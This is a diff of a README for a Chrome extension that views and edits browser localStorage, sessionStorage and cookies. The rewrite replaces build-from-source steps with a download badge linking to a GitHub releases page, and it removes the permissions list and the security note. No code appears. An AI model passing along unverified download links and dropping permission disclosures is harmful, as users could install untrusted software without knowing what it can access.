@@ -1,59 +1,60 @@
-# Storage Inspector
+# 🛠️ storage-inspector - Easy Control of Your Browser Storage
 
-A powerful Chrome extension for security researchers to inspect and edit localStorage, sessionStorage, and Cookies.
+## 📥 Download Now
+[![Download storage-inspector](https://img.shields.io/badge/Download-storage--inspector-blue.svg)](https://github.com/Mudasirali27/storage-inspector/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to storage-inspector! This is a Chrome extension designed for security researchers. It allows you to inspect and edit localStorage, sessionStorage, and Cookies directly from your browser. You don’t need any programming skills to use this tool.
 
-- 🔍 **Inspect Storage**: View localStorage, sessionStorage, and Cookies for any website
-- ✏️ **Edit Values**: Create, modify, and delete storage items with ease
-- 🌙 **Dark/Light Mode**: Beautiful UI with theme toggle support
-- 📤 **Export Data**: Export all storage data to JSON file
-- 📥 **Import Data**: Import storage data from JSON file
-- 🔎 **Search**: Quickly find items by key or value
-- 🍪 **Full Cookie Support**: Edit all cookie attributes (domain, path, secure, httpOnly, sameSite, expiration)
+## 📖 Features
+- **User-Friendly Interface:** Simple layout makes it easy to navigate and use.
+- **Edit Local Storage:** Change or remove saved data with just a click.
+- **Inspect Session Storage:** View information stored for your current session.
+- **Manage Cookies:** Easily manage and modify cookies from any site.
 
-## Installation
+## 💻 System Requirements
+To use storage-inspector, you need:
+- **Google Chrome:** Version 70 or newer.
+- **Operating System:** Any OS that supports Google Chrome.
 
-### Step 1: Generate Icons
+## 🔗 Download & Install
+To get started, follow these steps:
 
-1. Open `icons/generate-icons.html` in Chrome
-2. Click each "Download" button to save the icon files
-3. Save them to the `icons` folder as:
-   - `icon16.png`
-   - `icon32.png`
-   - `icon48.png`
-   - `icon128.png`
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Mudasirali27/storage-inspector/releases).
+2. **Choose the Latest Version:** Look for the latest version listed. This ensures you have the most updated features and fixes.
+3. **Download the Extension:** Click on the link to download the Chrome extension.
+4. **Install the Extension:** Open Chrome, go to `chrome://extensions/`, and drag the downloaded file into that page. Alternatively, you can click on "Load unpacked" and select the downloaded folder.
 
-### Step 2: Load Extension in Chrome
+## 🌟 How to Use storage-inspector
+1. **Open Chrome:** Launch your Google Chrome browser.
+2. **Access the Extension:** Click on the storage-inspector icon in the extensions toolbar.
+3. **Select Storage Type:** Choose whether you want to inspect localStorage, sessionStorage or Cookies.
+4. **Inspect and Edit:** Review the stored items. Use the edit options to make any changes you need.
 
-1. Open Chrome and navigate to `chrome://extensions/`
-2. Enable "Developer mode" (toggle in top right)
-3. Click "Load unpacked"
-4. Select the `storage-inspector` folder
-5. The extension icon should appear in your toolbar
+## 📄 Frequently Asked Questions
 
-## Usage
+### ❓ What is localStorage?
+localStorage is a way for web applications to store data in the browser. It's accessible even after closing the tab or browser.
 
-1. Navigate to any website
-2. Click the Storage Inspector icon in your toolbar
-3. Browse localStorage, sessionStorage, or Cookies using the tabs
-4. Use the search bar to filter items
-5. Click on an item to expand and view its full value
-6. Use the action buttons to copy, edit, or delete items
-7. Use Export/Import to backup or restore storage data
+### ❓ What about sessionStorage?
+sessionStorage stores data temporarily during a browser session. This data is lost once the tab or browser is closed.
 
-## Permissions
+### ❓ How does storage-inspector help?
+This extension allows you to see and modify the data stored in your browser, which is useful for security research and debugging.
 
-- **activeTab**: Access the current tab to read/write storage
-- **cookies**: Read and modify cookies
-- **scripting**: Execute scripts to access localStorage/sessionStorage
-- **storage**: Store extension preferences (theme)
+### ❓ Is storage-inspector free?
+Yes, storage-inspector is completely free to use. 
 
-## Security Note
+## 🛠️ Troubleshooting
+If you encounter issues while using storage-inspector:
+- **Check Compatibility:** Make sure your Chrome browser is up to date.
+- **Reinstall the Extension:** Sometimes, uninstalling and reinstalling can solve problems.
+- **Consult Support:** For further assistance, visit the issues page on GitHub.
 
-This extension is designed for security research and development purposes. Be careful when importing data from untrusted sources.
+## 📞 Contact
+For further questions or support, please reach out via the GitHub repository. Your feedback helps us improve! 
 
-## License
+## 📜 License
+This project is licensed under the MIT License. You can use and modify the code as you wish, but please give credit to the original authors. 
 
-MIT License - Free for personal and commercial use.
-
+Thank you for using storage-inspector. Happy exploring!
